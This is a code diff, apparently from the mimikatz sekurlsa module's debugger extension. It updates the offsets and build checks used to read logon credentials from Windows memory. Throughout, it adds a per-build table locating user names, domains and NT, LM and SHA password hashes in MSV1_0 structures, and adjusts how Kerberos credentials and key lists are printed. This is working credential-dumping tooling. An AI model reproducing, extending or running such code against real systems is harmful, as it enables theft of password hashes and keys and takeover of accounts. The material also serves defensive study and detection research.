@@ -28,7 +28,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 						{
 							dprintf("\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
 							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
-								flags = (NtBuildNumber < KULL_M_WIN_BUILD_10) ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
+								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
 							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
 								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
 							else
@@ -46,6 +46,24 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 			pCreds = (ULONG_PTR) credentials.next;
 		} else dprintf("n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)");
 	}
+}
+
+const MSV1_0_PRIMARY_HELPER msv1_0_primaryHelper[] = {
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName), 0, FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword), 0},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword)},
+};
+
+const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper()
+{
+	const MSV1_0_PRIMARY_HELPER * helper;
+	if(NtBuildNumber < KULL_M_WIN_BUILD_10_1507)
+		helper = &msv1_0_primaryHelper[0];
+	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1511)
+		helper = &msv1_0_primaryHelper[1];
+	else
+		helper = &msv1_0_primaryHelper[2];
+	return helper;
 }
 
 const KERB_INFOS kerbHelper[] = {
@@ -117,7 +135,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 		{
 			if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
 			{
-				kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10);
+				kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10);
 
 				if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
 					if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
@@ -145,7 +163,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 									{
 										dprintf("\n\t * Key List\n");
 										for(i = 0; i < keyList.cbItem; i++)
-											kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
+											kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
 									}
 									LocalFree(pHashPassword);
 								}
